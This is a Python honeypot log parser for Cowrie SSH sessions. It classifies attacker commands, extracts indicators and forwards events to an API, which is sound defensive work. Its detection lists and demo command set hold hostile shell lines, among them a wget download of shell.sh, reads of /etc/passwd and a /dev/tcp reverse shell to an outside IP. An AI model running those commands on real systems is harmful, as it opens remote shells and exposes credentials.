#!/usr/bin/env python3
"""
SentinelAI Cowrie Log Parser
Usage:
  python log_parser.py --live          # watch cowrie.json in real time
  python log_parser.py --file f.json   # replay existing log
  python log_parser.py --demo          # generate fake sessions for testing
"""
import json, time, re, argparse, os, requests, logging, random
from datetime import datetime
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("sentinel.parser")

API_BASE      = os.getenv("SENTINEL_API", "http://localhost:5000/api")
API_KEY       = os.getenv("SENTINEL_KEY")
if not API_KEY:
    raise RuntimeError("Configuration error: SENTINEL_KEY environment variable is missing.")
COWRIE_LOG    = os.getenv("COWRIE_LOG",  "/opt/cowrie/var/log/cowrie/cowrie.json")
POLL_INTERVAL = 0.5
HEADERS = {"Content-Type":"application/json","X-API-Key":API_KEY,"X-Source":"cowrie-parser"}
_sessions = {}

IP_RE   = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
URL_RE  = re.compile(r"https?://[^\s\'\"]+")
HASH_RE = re.compile(r"\b[0-9a-fA-F]{32,64}\b")
SENSITIVE = ["/etc/passwd","/etc/shadow","/.ssh/","/root/","~/.bash_history"]
MALWARE   = ["wget","curl","chmod +x","base64 -d","/tmp/","python -c","nc -e","bash -i"]

def extract_iocs(text):
    return {"ips":list(set(IP_RE.findall(text))),"urls":list(set(URL_RE.findall(text))),"hashes":list(set(HASH_RE.findall(text))),"sensitiveFiles":[f for f in SENSITIVE if f in text]}

def classify_intent(cmd):
    c=cmd.lower()
    if re.search(r"cat /etc/(passwd|shadow)",c): return "CREDENTIAL_HARVEST"
    if re.search(r"(wget|curl)\s+https?://",c):  return "MALWARE_DOWNLOAD"
    if re.search(r"chmod|setuid",c):              return "PRIVILEGE_ESCALATION"
    if re.search(r"crontab|systemctl enable",c):  return "PERSISTENCE"
    if re.search(r"nc -e|bash -i|python -c",c):   return "REVERSE_SHELL"
    if re.search(r"uname|id|whoami|ifconfig",c):  return "RECONNAISSANCE"
    if re.search(r"rm -rf|dd if=",c):             return "DESTRUCTION"
    return "UNKNOWN"

def post(ep, data):
    try: r=requests.post(f"{API_BASE}{ep}",json=data,headers=HEADERS,timeout=5); return r.status_code<400
    except: return False

def ensure_session_opened(sid):
    meta = _sessions.get(sid)
    if not meta:
        return False
    if not meta.get("openedPosted"):
        meta["hasSSHActivity"] = True
        if not post("/honeypot/ingest", {
            "eventType": "SESSION_OPENED",
            "sessionId": sid,
            "sourceIP": meta["sourceIP"],
            "sourcePort": meta.get("sourcePort", 0),
            "honeypotNode": "SSH-COWRIE-01",
            "protocol": "SSH"
        }):
            log.warning(f"Session opening was not acknowledged: {sid}")
            return False
        meta["openedPosted"] = True
        log.info(f"SSH session opening acknowledged: {sid} from {meta['sourceIP']}")
    return True

def on_connect(e):
    sid, ip = e.get("session", "?"), e.get("src_ip", "0.0.0.0")
    _sessions[sid] = {
        "sessionId": sid,
        "sourceIP": ip,
        "sourcePort": e.get("src_port", 0),
        "startTime": e.get("timestamp"),
        "commands": [],
        "credentials": [],
        "hassh": "",
        "hasSSHActivity": False,
        "openedPosted": False
    }

def on_login_failed(e):
    sid = e.get("session", "?")
    if sid not in _sessions: return
    if not ensure_session_opened(sid): return
    _sessions[sid]["credentials"].append({"username": e.get("username"), "password": e.get("password"), "success": False})

def on_login_ok(e):
    sid = e.get("session", "?")
    if sid not in _sessions: return
    if not ensure_session_opened(sid): return
    log.warning(f"Login SUCCESS: {_sessions[sid]['sourceIP']} (credentials omitted)")
    _sessions[sid]["credentials"].append({"username": e.get("username"), "password": e.get("password"), "success": True})

def on_cmd(e):
    sid = e.get("session", "?")
    cmd = (e.get("input", "")).strip()
    if not cmd or sid not in _sessions: return
    if not ensure_session_opened(sid): return
    ip = _sessions[sid]["sourceIP"]
    intent = classify_intent(cmd)
    iocs = extract_iocs(cmd)
    log.info("Command [%s]: %s (content omitted)", intent, ip)
    _sessions[sid]["commands"].append({"command": cmd, "intent": intent})
    post("/honeypot/ingest/command", {
        "sessionId": sid,
        "sourceIP": ip,
        "command": cmd,
        "intent": intent,
        "iocs": iocs,
        "isMalware": bool(URL_RE.search(cmd) and "wget" in cmd.lower())
    })

def on_download(e):
    sid = e.get("session", "?")
    url = e.get("url", "")
    if not url or sid not in _sessions: return
    if not ensure_session_opened(sid): return
    ip = _sessions[sid]["sourceIP"]
    log.warning("FILE DOWNLOAD: %s (URL omitted)", ip)
    post("/honeypot/ingest/download", {
        "sessionId": sid,
        "sourceIP": ip,
        "url": url,
        "sha256": e.get("shasum", ""),
        "filename": e.get("outfile", "")
    })

def on_kex(e):
    sid = e.get("session", "?")
    hassh = e.get("hassh", "")
    if not hassh or sid not in _sessions: return
    if not ensure_session_opened(sid): return
    _sessions[sid]["hassh"] = hassh
    log.info(f"SSH client hassh: {sid} -> {hassh}")
    post("/honeypot/ingest", {"eventType": "CLIENT_KEX", "sessionId": sid, "hassh": hassh})

def on_closed(e):
    sid = e.get("session", "?")
    dur = e.get("duration", 0)
    meta = _sessions.get(sid)
    if not meta: return
    if meta.get("openedPosted"):
        acknowledged = post("/honeypot/ingest/close", {
            "sessionId": sid,
            "sourceIP": meta.get("sourceIP", "?"),
            "durationSeconds": int(dur),
            "commands": meta.get("commands", []),
            "credentials": meta.get("credentials", []),
            "hassh": meta.get("hassh", "")
        })
        if not acknowledged:
            log.warning("Session closure delivery was not acknowledged; retaining local state")
            return
        log.info(f"Session closed: {sid} ({dur}s)")
    else:
        log.debug(f"Ignoring connection with zero SSH activity: {sid} from {meta.get('sourceIP', '?')}")
    _sessions.pop(sid, None)

HANDLERS={"cowrie.session.connect":on_connect,"cowrie.login.failed":on_login_failed,"cowrie.login.success":on_login_ok,"cowrie.command.input":on_cmd,"cowrie.session.file_download":on_download,"cowrie.session.closed":on_closed,"cowrie.client.kex":on_kex}

def process(line):
    try:
        e = json.loads(line.strip())
        h = HANDLERS.get(e.get("eventid", ""))
        if h:
            h(e)
    except Exception as ex:
        log.error("Error processing log event (%s)", type(ex).__name__)

def tail(filepath):
    path = Path(filepath)
    if not path.exists():
        log.warning(f"Waiting for {filepath}...")
        while not path.exists():
            time.sleep(2)
    log.info(f"Tailing {filepath} -> {API_BASE}")
    current_file = None
    current_ino = None
    last_pos = 0
    try:
        current_file = open(filepath, "r", encoding="utf-8", errors="ignore")
        current_ino = os.stat(filepath).st_ino
        current_file.seek(0, 2)
        last_pos = current_file.tell()
        while True:
            try:
                if not os.path.exists(filepath):
                    time.sleep(POLL_INTERVAL)
                    continue
                stat = os.stat(filepath)
                if stat.st_ino != current_ino or stat.st_size < last_pos:
                    log.info(f"Log rotated/recreated: {filepath}")
                    current_file.close()
                    current_file = open(filepath, "r", encoding="utf-8", errors="ignore")
                    current_ino = stat.st_ino
                    last_pos = 0
                if stat.st_size > last_pos:
                    current_file.seek(last_pos)
                    while True:
                        line = current_file.readline()
                        if not line:
                            break
                        process(line)
                        last_pos = current_file.tell()
            except Exception as ex:
                log.error("Tail error (%s)", type(ex).__name__)
            time.sleep(POLL_INTERVAL)
    finally:
        if current_file and not current_file.closed:
            current_file.close()

def replay(filepath, delay=0.0):
    with open(filepath,"r") as f:
        for line in f: process(line); delay and time.sleep(delay)

DEMO_IPS=["185.220.101.47","45.95.147.22","194.165.16.78","91.92.252.10"]
DEMO_CMDS=["uname -a","id","cat /etc/passwd","wget http://45.95.147.22/shell.sh","chmod +x shell.sh","ls -la /root","ps aux","netstat -tulnp","crontab -e","bash -i >& /dev/tcp/45.95.147.22/4444 0>&1"]

def demo(n=5):
    import uuid
    for i in range(n):
        sid=f"demo-{uuid.uuid4().hex[:8]}"; ip=random.choice(DEMO_IPS); num_cmds=random.randint(2,8); dur=random.randint(30,480)
        on_connect({"session":sid,"src_ip":ip,"src_port":random.randint(49152,65535)})
        time.sleep(0.1)
        on_kex({"session":sid,"hassh":"6372ee6957562199b2fb773b0be1bf34"})
        time.sleep(0.2); on_login_failed({"session":sid,"username":"root","password":"123456"})
        time.sleep(0.2); on_login_ok({"session":sid,"username":"root","password":"toor"})
        for _ in range(num_cmds): time.sleep(0.1); on_cmd({"session":sid,"input":random.choice(DEMO_CMDS)})
        on_closed({"session":sid,"duration":dur}); log.info(f"Demo session {i+1}/{n} done"); time.sleep(0.5)
    log.info("Demo complete!")

if __name__=="__main__":
    p=argparse.ArgumentParser()
    p.add_argument("--live",action="store_true"); p.add_argument("--file",type=str)
    p.add_argument("--demo",action="store_true"); p.add_argument("--sessions",type=int,default=5)
    p.add_argument("--delay",type=float,default=0.0); p.add_argument("--log",type=str,default=COWRIE_LOG)
    a=p.parse_args()
    if a.demo: demo(a.sessions)
    elif a.live:
        try: tail(a.log)
        except KeyboardInterrupt: log.info("Stopped")
    elif a.file: replay(a.file,a.delay)
    else: p.print_help()
